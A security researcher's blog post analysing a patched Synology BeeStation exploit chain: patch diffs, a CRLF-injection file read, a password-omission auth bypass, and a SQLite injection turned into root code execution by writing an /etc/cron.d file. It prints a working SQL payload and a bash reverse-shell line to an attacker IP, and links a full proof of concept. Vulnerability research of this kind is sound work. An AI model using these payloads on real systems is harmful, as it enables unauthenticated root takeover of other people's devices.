---
layout: post
author: Kiddo
title: "Writing Sync, Popping Cron: DEVCORE's Synology BeeStation RCE & A Novel SQLite RCE Technique (CVE-2024-50629~50631)"
toc: true
---

# Introduction

While preparing for Pwn2Own Ireland 2025 back in September, I was reviewing N-day bugs in Synology NAS for inspiration. I was particularly captivated by the [Synology BeeStation (BST150-4T) chain](https://x.com/thezdi/status/1849381296771891372?s=20) disclosed by the _legendary_ DEVCORE during Pwn2Own 2024. It was so fascinating that I decided to deep dive into the patches:

![]({{"assets/images/2025-11-30-writing-sync-popping-cron/x_thezdi_tweet.png" | relative_url}})

However, two weeks ago, I stumbled upon a [tweet from b33f](https://x.com/FuzzySec) referencing "[寫作 Sync, 唸作 Shell ~#](https://t.co/EBx89AQe9r)(Writing Sync, Reading Shell)". I realized that while I was busy patch diffing and developing exploits in isolation, the original researchers had already released detailed findings earlier this year.

**Me:** "Wait... what have I been doing all this time?" 🤦‍♂️

![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/disappointed-face-palm.gif" | relative_url}})

**But here is the twist!** While comparing our approaches, I noticed that my path to Remote Code Execution (RCE) deviated from the original research.

Rather than a completely new discovery, I had identified a simple universal application of the SQLite "Dirty File Write" primitive. I verified SQLite Injection to target the **crontab**, establishing a reliable RCE vector specifically for PHP-free environments—a scenario lacking published universal technique.

In this post, I will share the technical details of my N-day analysis and introduce this SQLite-to-Crontab RCE technique, which serves as a universal alternative in the PHP web shell.

> Disclaimer: I am not the original discoverer. I only conducted N-day analysis independently after patches were released. This post is published with the blessing of the original researchers!

# Advisory Summary

The exploit chain comprises three distinct vulnerabilities that allow an unauthenticated attacker to achieve root privileges:

| CVE                | ZDI Advisory                                                                                                                                  | Vendor Advisory                                                                                                              | Component             | Version                              | Details                                        | Impact                        |
| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- | --------------------- | ------------------------------------ | ---------------------------------------------- | ----------------------------- |
| **CVE-2024-50629** | [Synology BeeStation BST150-4T CRLF Injection Information Disclosure Vulnerability](https://www.zerodayinitiative.com/advisories/ZDI-25-211/) | [Synology-SA-24:20 DSM (PWN2OWN 2024)](https://www.synology.com/en-us/security/advisory/Synology_SA_24_20)                   | OS (DSM/BSM)          | DSM < 7.2.2-72806-1, BSM < 1.1-65374 | CRLF Injection in HTTP requests                | Pre-auth Restricted File Read |
| **CVE-2024-50630** | [Synology BeeStation BST150-4T Improper Authentication Vulnerability](https://www.zerodayinitiative.com/advisories/ZDI-25-212/)               | [Synology-SA-24:21 Synology Drive Server (PWN2OWN 2024)](https://www.synology.com/en-us/security/advisory/Synology_SA_24_21) | Synology Drive Server | < 3.5.1-26102                        | Incorrect auth algorithm in `syncd` / `webapi` | Restricted Auth Bypass        |
| **CVE-2024-50631** | [Synology BeeStation BST150-4T SQL Injection Remote Code Execution Vulnerability](https://www.zerodayinitiative.com/advisories/ZDI-25-213/)   | [Synology-SA-24:21 Synology Drive Server (PWN2OWN 2024)](https://www.synology.com/en-us/security/advisory/Synology_SA_24_21) | Synology Drive Server | < 3.5.1-26102                        | SQL Injection in `update_settings` command     | Post-auth RCE                 |

By cross-referencing the ZDI and Synology advisories, I constructed the table above. While each advisory provided only partial details, correlating them revealed clearer attack contexts.

For instance, regarding the Auth Bypass (CVE-2024-50630), ZDI identified the flaw within the `syncd` handler, whereas Synology referenced `webapi`. Combining these clues (with proper investigation!) led to the hypothesis that the vulnerability likely involved leveraging the `webapi` component to trigger the improper authentication logic inside `syncd`.

# Attack Surface

To understand the vulnerability chain, we need to briefly review two key components: `webapi` and `syncd`.

## webapi

BeeStation web exposes most functionality via a single endpoint: `/webapi/entry.cgi`. `nginx` forwards requests to the `synoscgi` Unix Domain Socket, which routes them to specific shared libraries (`.so`) based on configuration files (`.lib`).

```json
{
  "SYNO.API.Auth": {
    "appPriv": "",
    "authLevel": 0,
    "disableSocket": false,
    "lib": "lib/SYNO.API.Auth.so",
    "maxVersion": 7,
    "methods": {
      "1": [
        {
          "logout": {
            "cgiProcReusable": true,
            "grantByUser": false,
            "grantable": true,
            "systemdSlice": ""
          }
        }
      ],
```

An important attribute in here is `authLevel`, which defines the authentication requirements:

- `0`: No authentication needed
- `1`: Authentication needed
- `2`: No authentication needed, If authenticated accessible area might be different

## syncd

The `syncd` daemon is the core of Synology Drive Server package. It listens on two channels to support different client types:

![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/syncd_mermaid.png" | relative_url}})

1. Unix Domain Socket: Used by `webapi` (Browsers). Requests are proxied locally through `entry.cgi`.
2. TCP Port 6690: Used by desktop/mobile apps. Direct TCP connection.

Although the protocol supports encryption, it can be disabled via the Desktop App settings. Alternatively, cleartext traffic can be captured by sniffing the Unix Domain Socket. Below is a captured packet dump:

_File: `/usr/syno/synoman/webapi/SYNO.API.Auth.lib`_

```
00000000: 25 52 18 14 46 12 00 00  42 10 00 06 40 70 72 6F  %R..F...B...@pro
00000010: 74 6F 42 10 00 0D 62 6F  64 79 2D 63 6F 6E 74 69  toB...body-conti
00000020: 6E 75 65 01 01 00 10 00  04 64 61 74 65 01 01 00  nue......date...
00000030: 10 00 04 74 79 70 65 10  00 06 68 65 61 64 65 72  ...type...header
00000040: 10 00 07 76 65 72 73 69  6F 6E 42 10 00 05 6D 61  ...versionB...ma
00000050: 6A 6F 72 01 01 07 10 00  05 6D 69 6E 6F 72 01 01  jor......minor..
00000060: 00 40 40 10 00 06 61 63  74 69 6F 6E 10 00 0F 75  .@@...action...u
00000070: 70 64 61 74 65 5F 73 65  74 74 69 6E 67 73 10 00  pdate_settings..
...
```

# The Bugs

## CVE-2024-50630: Improper Authentication

The first vulnerability stems from a logical flaw in how `syncd` handles authentication requests from various channels (`webapi` vs TCP:6690).

Analysis began by examining the patch for [Synology Drive Server 3.5.1-26102](https://archive.synology.com/download/Package/SynologyDrive/3.5.1-26102). A comparison of `SYNO.SynologyDrive.lib` reveals the removal of the `authenticate` method from the `SYNO.SynologyDrive.Authentication` endpoint:

```diff
    "SYNO.SynologyDrive.Authentication": {
    // ...
        "authLevel": 2, // [!]
        "lib": "\/var\/packages\/SynologyDrive\/target\/webapi\/drive\/authentication\/SYNO.SynologyDrive.Authentication.so",
        "maxVersion": 3,
         "methods": {
             "1": [
                 {
-                    "authenticate": { // [!]
-                        "allowDemo": true,
-                        "grantByUser": false,
-                        "grantable": true
-                    }
-                },
```

The `authenticate` method acts as a proxy between the `webapi` and the backend `syncd` daemon. Its role is to forward authentication requests via the Unix Domain Socket.

In a legitimate scenario, when both username and password are provided, the `authenticate` method forwards them, and `syncd` validates authentication.

![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/cve-2024-50630_burp_1.png" | relative_url}})

On the backend, `syncd` processes these requests within the `AuthenticatorMiddleware::AuthSession` function. The routing logic evaluates authentication methods in a specific sequence:

```cpp
__int64 __fastcall AuthenticatorMiddleware::AuthSession(
        AuthenticatorMiddleware *this,
        const PObject *a2,
        Request *a3,
        Response *a4)
{
// ...
  sub_21F3B0(&v33, "username");
  v26 = PObject::hasMember(Header, &v33);
// ...
  sub_21F3B0(&v36, "password");
  v26 = PObject::hasMember(Header, &v36);
// ...
  if ( v26 )
  {
    v6 |= AuthenticatorMiddleware::AuthByUserPassword(this, a2, a3, a4); // [!]
    return v6;
  }
LABEL_18:
  sub_21F3B0(&v33, "auth-by-domainsocket");
  v18 = (PObject *)PObject::operator[](a2, &v33);
  if ( !(unsigned __int8)PObject::asBool(v18) )
    goto LABEL_19;
  sub_21F3B0(&v36, "username"); // [!]
  v19 = PObject::hasMember(Header, &v36);
// ...
  v22 = Request::IsFromLocal(a3); // [!]
  v20 = v36;
  v19 = v22;
// ...
  if ( v19 )
  {
    v6 |= AuthenticatorMiddleware::AuthByDomainSocket(this, a2, a3, a4); // [!]
    return v6;
  }
```

The evaluation order is as follows:

1. If both `username` and `password` are present, `AuthenticatorMiddleware::AuthByUserPassword` is called.
2. If the `password` is missing, logic then falls through to the next check.
3. If `Request::IsFromLocal` returns true, which is valid for Unix Domain Socket requests via `webapi`, `AuthenticatorMiddleware::AuthByDomainSocket` is called.

Inside `AuthenticatorMiddleware::AuthByDomainSocket`, the logic implicitly trusts the local origin and validates only the `username`, which seems to be not allowed by external channel:

```cpp
__int64 __fastcall AuthenticatorMiddleware::AuthByDomainSocket(
        AuthenticatorMiddleware *this,
        const PObject *a2,
        Request *a3,
        Response *a4)
{
// ...
  Header = Request::GetHeader(a3);
  UserInfo::UserInfo((UserInfo *)v14);
  v12[0] = v13;
  strcpy((char *)v13, "username"); // [!]
  v12[1] = &byte_8;
  v7 = PObject::operator[](Header, v12);
  PObject::asString[abi:cxx11](v10, v7);
  if ( v12[0] != v13 )
    operator delete(v12[0], v13[0] + 1LL);
  if ( (int)AuthenticatorMiddleware::PrepareNormalUser(this, v10, v14, a4) < 0 ) // [!]
  {
    v8 = 0;
  }
  else
  {
    Request::SetUser(a3, (UserInfo *)v14);
    v8 = 1;
  }
```

The interesting oversight is that the `authenticate` method does not seem to check the presence of the `password` parameter before forwarding the request, likely under the assumption that `syncd` would perform the necessary validation.

![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/cve-2024-50630_trust_you.png" | relative_url}})

Consequently, by intentionally omitting the `password`, I could force the execution flow into the `AuthByDomainSocket` path, obtaining `access_token` based solely on the `username`:

![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/cve-2024-50630_burp_2.png" | relative_url}})

However, since this attack is dependent on knowing a valid `username`, it represents a conditional bypass. Given that Pwn2Own rules strictly prohibit unrealistic assumptions, a secondary bug is required to leak a valid user identifier.

> _"Any unrealistic assumptions (e.g., prior knowledge of internal or user-specific identifiers) are out of scope."_

## CVE-2024-50629: CRLF Injection

To satisfy the prerequisite for the authentication bypass (a valid `username`), the analysis scope shifted to finding an information leak.

I examined the incremental patches for [DSM 7.2.2-72806-1](https://archive.synology.com/download/Os/DSM/7.2.2-72806-1), as the advisory indicated DSM was also affected. The DSM patch size (4.57MB) provided a significantly reduced search space compared to the full BSM firmware:

![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/cve-2024-50629_patch.png" | relative_url}})

Within `SYNO.API.Auth.so`, `SYNO::auth_redirect_uri_run` function changed. The patch introduced explicit validation to reject Carriage Return (`\r`) and Line Feed (`\n`) characters in the `redirect_url` parameter:

```diff
unsigned __int64 __fastcall SYNO::auth_redirect_uri_run(SYNO *this, SYNO::APIRequest *a2, SYNO::APIResponse *a3) {
  // ...
  v29 = dest;
  strcpy((char *)dest, "redirect_url"); // [!]
  v30 = 12LL;
  SYNO::APIRequest::GetParam(v19, this, &v29, v18);
  Json::Value::asString[abi:cxx11](&v23, v19);
  Json::Value::~Value((Json::Value *)v19);
  if ( v29 != dest )
    operator delete(v29, dest[0] + 1LL);
  Json::Value::~Value((Json::Value *)v18);
  v4 = std::string::find(&v23, "?", 0LL, 1LL);
  // ...
     if ( v29 != dest )
       operator delete(v29, dest[0] + 1LL);
+    if ( std::string::find(&v23, "\r", 0LL, 1LL) != -1 || std::string::find(&v23, "\n", 0LL, 1LL) != -1 ) // [!]
+    {
+LABEL_18:
+      Json::Value::Value(v19, 0LL);
+      SYNO::APIResponse::SetError(a2, 120, (const Json::Value *)v19);
+      goto LABEL_19;
+    }
    // ...
      __printf_chk(2LL, "Status: 302 Found\r\n");
      __printf_chk(2LL, "Location: %s\r\n", (const char *)v23); // [!]
      __printf_chk(2LL, "\r\n");}
```

In the unpatched version, the `redirect_url` parameter (`v23`) is passed directly to `__printf_chk` to construct the `Location` header of HTTP response. This lack of sanitization results in a CRLF Injection in the `SYNO.API.Auth.RedirectURI` API.

By appending `%0d%0a` to the `redirect_url` parameter, I could inject arbitrary HTTP headers into the server response:

![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/cve-2024-50629_burp_1.png" | relative_url}})

### X-Accel-Redirect to Leak Username

To weaponize this CRLF Injection in `nginx` environment, the `X-Accel-Redirect` header was utilized. This header enables an attacker to force an internal redirection (SSRF-like behavior), granting access to protected locations defined in the `nginx` configuration.

As noted in prior research by [Justin Taft](https://justintaft.com/blog/cve-2021-29084-synology-crlf-unauthenticated-file-downloads), the `/volume1/` directory is accessible via an internal alias, providing access to application data or system files:

_File: `/etc/nginx/nginx.conf`_

```
 server {

        listen 80;
        listen [::]:80;
        ...

        location ~ ^/volume(?:X|USB|SATA|Gluster)?\d+/ {
            internal;
            root /;
            open_file_cache off;
            include conf.d/x-accel.*.conf;
        }
```

To satisfy the constraint for the authentication bypass, a file containing a valid username was required. I identified the Synology Drive Server initialization log as a viable source for this information leak:

_File: `/volume1/@synologydrive/log/cloud-workerd.log`_

```
root@BeeStation:/volume1/@synologydrive/log# cat cloud-workerd.log
2025-11-28T23:17:53 (22542:17152) [INFO] checkpoint-task.cpp.o(44): Checkpoint task is Up.
2025-11-28T23:17:53 (22542:89856) [INFO] job-queue-client.cpp.o(103): JobQueueClient Setup started.
2025-11-28T23:17:53 (22542:89856) [INFO] job-queue-client.cpp.o(132): JobQueueClient Setup done.
2025-11-28T23:17:53 (22542:89856) [INFO] cloud-workerd.cpp.o(323): MainLoop started.
2025-11-28T23:17:51 (22542:31264) [INFO] add-index-job.cpp.o(27): AddIndexJob job: '{"rule_group":"SYNO.SDS.Drive.Application:drive:displayname","rule_name":"Synology Drive (kiddo.pwn)","watch_path":"/homes/kiddo.pwn"}'. # [!]
```

Since the log records home directory paths upon initialization, it exposes the system username(i.e. `kiddo.pwn`). Leveraging the CRLF Injection to inject `X-Accel-Redirect` allowed for the retrieval of this log, yielding the valid username for the last stage:

![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/cve-2024-50629_burp_2.png" | relative_url}})

## CVE-2024-50631: SQL Injection

While the `webapi` requires session validation (authLevel `1`), the binary protocol on TCP:6690 accepts the `access_token` directly. By implementing a custom `syncd` client, I could interact with the daemon and access the `update_settings` command—flagged in advisory (CVE-2024-50631) as vulnerable to SQL Injection.

Patch diffing of `libsynosyncservercore.so` revealed the fix: `EscapeString` was added to sanitize two parameters that were previously concatenated directly into SQL queries:

```diff
__int64 __fastcall synodrive::db::syncfolder::ManagerImpl::UpdateApplicationSettings(
        synodrive::db::syncfolder::ManagerImpl *this,
        db::ConnectionHolder *a2,
        const db::ApplicationSetting *a3) {
  // ...
+  Op = db::ConnectionHolder::GetOp(this);
+  db::ApplicationSetting::GetSharingLinkCustomization[abi:cxx11](v113, a2);
+  DBBackend::DBEngine::EscapeString(v86, Op, v113); // [!]
+  if ( v113[0] != &v114 )
+    operator delete(v113[0], v114 + 1);
+  v6 = db::ConnectionHolder::GetOp(this);
+  db::ApplicationSetting::GetSharingLinkFullyCustomURL[abi:cxx11](v113, a2);
+  DBBackend::DBEngine::EscapeString(v88, v6, v113); // [!]
+  if ( v113[0] != &v114 )
+    operator delete(v113[0], v114 + 1);
```

In the unpatched version, the user-controllable string parameters `sharing_link_customization` and `sharing_link_fully_custom_url` are concatenated into this `UPDATE` statement without escaping:

```sql
UPDATE setting_table SET
    ...
    sharing_link_customization = "<user_string_input>",
    sharing_link_fully_custom_url = "<user_string_input>",
    ...
DELETE FROM enable_sharing_table;
```

Injecting a double quote (e.g.: `";foo`) breaks the query syntax, verifying the SQLite Injection:

_File: `/volume1/@synologydrive/log/syncfolder.log`_

```
2025-11-30T16:04:06 (14186:80224) [ERROR] sqlite_engine.cpp.o(155): sqlite3_exec error: near "foo": syntax error (1) sql = UPDATE setting_table SET sharing_level = 0,sharing_internal_level = 0,sharing_force_selected = 0,sharing_force_password = 0,sharing_force_expiration = 0,default_enable_full_content_indexing = 0,force_https_sharing_link = 0,enable_sharing_link_customization = 1,sharing_link_customization = "";foo",sharing_link_fully_custom_url = "",default_displayname = 0,enable_c2share_offload = 0,sharing_link_by_email = 0; DELETE FROM enable_sharing_table;
```

## Exploitation

The general exploitation technique for SQLite Injection involves using `ATTACH DATABASE` to write a [PHP web shell](https://web.archive.org/web/20131208191957/https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet). However, the BeeStation does not include a PHP interpreter:

```bash
# ps -ef |grep php
root     19839 19814  0 17:57 pts/0    00:00:00 grep --color=auto php
```

This necessitates an alternative code execution path that functions without PHP.

## Strategy: Think SQLite Injection as a Dirty File Write

`ATTACH DATABASE` allows an attacker to create arbitrary files on the system. This can be weaponized as a _Dirty File Write_ primitive. However, the resulting file is a SQLite database, which inevitably contains binary headers and metadata ("Binary Pollution").

There are constraints in terms of what files can be written:

1. **Constraint 1**: Cannot overwrite existing non-Database files. `ATTACH` fails if target file exists and isn't a valid SQLite DB.
2. **Constraint 2**: Output contains binary SQLite metadata. This "pollution" can break parsers that expect clean text files.

![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/exploit_checkpoint_1.png" | relative_url}})
_Source: Check Point Research_

This is why PHP web shells have been the go-to target for SQLite injection:

1. **Constraint 1**: Simply create a new `.php` file that doesn't exist yet.
2. **Constraint 2**: The PHP interpreter is forgiving—it ignores the binary garbage until it encounters the `<?php` tag.

![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/exploit_checkpoint_2.png" | relative_url}})
_Source: Check Point Research_

Without PHP, we need to consider another parser that could tolerate binary pollution. A promising candidate that met all the constraints: **crontab**.

## Solution: Fault-Tolerant Crontab

What makes crontab special? As documented in [_Disguise and Delimit_](https://assets.contentstack.io/v3/assets/blte4f029e766e6b253/bltad0709de42b54e82/689604359f008cdd02f69917/disguise-delimit-whitepaper.pdf) by [Ryan Emmons](https://x.com/the_emmons), the cron daemon exhibits a unique fault tolerance:

> _"Surprisingly... the cron daemon will simply ignore malformed lines and continue down the file to locate valid lines."_

This is exactly what we need. If we can inject a valid crontab entry surrounded by newlines (`\n`), the cron daemon will treat the SQLite binary headers as "malformed lines" and simply skip over them.

![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/exploit_kirby.gif" | relative_url}})

Here's how this bypasses the SQLite Dirty File Write constraints:

1. **Constraint 1**: Create a new crontab file (e.g., `/etc/cron.d/pwn.task`), which doesn't exist yet.
2. **Constraint 2**: Wrap the crontab entry with newlines (`\n`) to isolate it from the binary metadata.

### Technique in Action

BeeStation uses `/etc/cron.d/` for crontab files and expects this crontab format:

```
# ┌───────────── minute (0-59)
# │ ┌───────────── hour (0-23)
# │ │ ┌───────────── day of month (1-31)
# │ │ │ ┌───────────── month (1-12)
# │ │ │ │ ┌───────────── day of week (0-6)
  * * * * * user command
```

Since there was no input validation restricting newline characters, I constructed the following payload:

```python
payload = '";'
payload += "ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;"
payload += "CREATE TABLE cron.tab (dataz text);"
payload += f"INSERT INTO cron.tab (dataz) VALUES ('\n* * * * * root bash -i >& /dev/tcp/{self.lhost}/{self.LPORT} 0>&1\n');"
payload += "--"
```

The payload is expected to work as follow:

1. Break out of the original query with `";`
2. Attach a new SQLite database file at `/etc/cron.d/pwn.task`
3. Create a table to hold the text payload
4. Insert the crontab entry, wrapped with newlines to isolate it from SQLite metadata
5. Comment out the remainder of the original SQL query with `--`

Upon execution, the created file `/etc/cron.d/pwn.task` contains a mix of binary SQLite headers and injected text. But thanks to the newlines, crontab entry sits cleanly on its own line:

![]({{"/assets/images/2025-11-30-writing-sync-popping-cron/exploit_pwn_task.png" | relative_url}})
_Red: New Line(`\n`), Blue: Crontab Line_

When viewed as text, the file appears as:

```bash
$ cat /etc/cron.d/pwn.task
��@�tabletabtabCREATE TABLE tab (dataz text)
* * * * * root bash -i >& /dev/tcp/192.168.88.254/1337 0>&1
```

When `cron` parses this file, it discards the SQLite binary headers as invalid line and executes only the valid crontab line—giving us a `root` reverse shell:

```bash
$ ps -ef
...
root     16486  9626  0 12:59 ?        00:00:00 /usr/sbin/CROND -n
root     16487 16486  0 12:59 ?        00:00:00 /bin/sh -c bash -i >& /dev/tcp/192.168.88.254/1337 0>&1
root     16488 16487  0 12:59 ?        00:00:00 bash -i
```

# Proof of Concept

Combining all three vulnerabilities I built a complete exploit chain. The PoC demonstrates full unauthenticated RCE on affected BeeStation devices. Enjoy the Demo!

- PoC: [https://github.com/kiddo-pwn/CVE-2024-50629_50631](https://github.com/kiddo-pwn/CVE-2024-50629_50631)

<video controls style="max-width: 100%;">
    <source src="{{ "/assets/images/2025-11-30-writing-sync-popping-cron/demo.mp4" | relative_url }}" type="video/mp4">
</video>

# Conclusion

This chain is a compelling case study of how chaining seemingly low-severity primitives can bridge the gap to full system compromise. A CRLF injection reads limited file, a conditional auth bypass, and a post-auth SQL injection—while individually limited, they become critical when chained together.

Primary credit for the discovery of these vulnerabilities belongs to [Pumpkin](https://x.com/u1f383) and [Orange Tsai](https://x.com/orange_8361) of DEVCORE. Additionally, the research by [Ryan Emmons](https://x.com/the_emmons) provided the theoretical foundation for the exploitation.

Thhis SQLite-to-Crontab technique demonstrates a universal application feasible in general Linux environments. Fundamentally, this is simply a re-application of Dirty File Write primitives—shifting the exploitation context from PHP's parsing logic to the cron daemon.

By generalizing this vector, I hope this technique serves as a viable RCE option in PHP-free environments!

# References

- [https://x.com/thezdi/status/1849381296771891372?s=20](https://x.com/thezdi/status/1849381296771891372?s=20)
- [https://x.com/FuzzySec/status/1990917597458739391?s=20](https://x.com/FuzzySec/status/1990917597458739391?s=20)
- [https://conf.devco.re/2025/keynote/%5BRelease%5D%20%E5%AF%AB%E4%BD%9C%20Sync%EF%BC%8C%E5%94%B8%E4%BD%9C%20Shell%20~%23.pdf](https://conf.devco.re/2025/keynote/%5BRelease%5D%20%E5%AF%AB%E4%BD%9C%20Sync%EF%BC%8C%E5%94%B8%E4%BD%9C%20Shell%20~%23.pdf)
- [https://www.zerodayinitiative.com/advisories/ZDI-25-211/](https://www.zerodayinitiative.com/advisories/ZDI-25-211/)
- [https://www.zerodayinitiative.com/advisories/ZDI-25-212/](https://www.zerodayinitiative.com/advisories/ZDI-25-212/)
- [https://www.zerodayinitiative.com/advisories/ZDI-25-213/](https://www.zerodayinitiative.com/advisories/ZDI-25-213/)
- [https://www.synology.com/en-us/security/advisory/Synology_SA_24_20](https://www.synology.com/en-us/security/advisory/Synology_SA_24_20)
- [https://www.synology.com/en-us/security/advisory/Synology_SA_24_21](https://www.synology.com/en-us/security/advisory/Synology_SA_24_21)
- [https://github.com/zeichensatz/SynologyPhotosAPI](https://github.com/zeichensatz/SynologyPhotosAPI)
- [https://justintaft.com/blog/cve-2021-29084-synology-crlf-unauthenticated-file-downloads](https://justintaft.com/blog/cve-2021-29084-synology-crlf-unauthenticated-file-downloads)
- [https://web.archive.org/web/20131208191957/https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet](https://web.archive.org/web/20131208191957/https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
- [https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/](https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/)
- [https://assets.contentstack.io/v3/assets/blte4f029e766e6b253/bltad0709de42b54e82/689604359f008cdd02f69917/disguise-delimit-whitepaper.pdf](https://assets.contentstack.io/v3/assets/blte4f029e766e6b253/bltad0709de42b54e82/689604359f008cdd02f69917/disguise-delimit-whitepaper.pdf)
- [https://linux.die.net/man/5/crontab](https://linux.die.net/man/5/crontab)
